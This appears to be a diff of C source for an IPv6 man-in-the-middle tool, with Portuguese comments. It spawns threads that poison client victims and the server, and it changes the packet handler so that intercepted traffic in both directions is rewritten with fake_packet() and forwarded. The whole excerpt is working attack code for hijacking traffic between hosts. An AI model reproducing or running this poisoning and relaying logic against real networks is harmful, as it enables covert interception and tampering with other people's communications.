@@ -53,7 +53,7 @@ void *poison(void *destination) {
 		send_packet(pkt1);
 		/* Poison server */
 		send_packet(pkt2);
-		sleep(2);
+		sleep(5);
 	}
 	/* FIXME: Memleaks */
 	free(pkt1);
@@ -84,7 +84,6 @@ void get_victims(char *packet) {
 				if (!victim_info_complete(cvictim))
 					populate_cvictim(packet);
 				if (!cvictim->poisoned) {
-					/* TODO */
 					printf("Thread de poison para o client.\n");
 					pthread_create(&pid0, NULL, poison, cvictim) ;
 				}
@@ -105,7 +104,9 @@ void packet_action(char *packet) {
 	if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
 		if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			printf("Packet Hijacked from client to server? >:-)\n");
-			debug_packet(packet);
+			//debug_packet(packet);
+			fake_packet(packet, &svictim);
+			send_packet(packet);
 			/* TODO */
 			switch (ip6->ip6_nxt) {
 				case IPPROTO_ICMPV6:
@@ -120,6 +121,10 @@ void packet_action(char *packet) {
 		} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
 			if (!memcmp(&(ip6->ip6_dst), &(cvictim->ipv6), sizeof(struct in6_addr))) {
 				printf("Packet Hijacked from server to client? >:-)\n");
+				fake_packet(packet, cvictim);
+				/* TODO: Enviar packet too big */
+				send_packet(packet);
+
 				/* Pacote enviado pela nossa vitima. */
 				switch (ip6->ip6_nxt) {
 					case IPPROTO_ICMPV6:
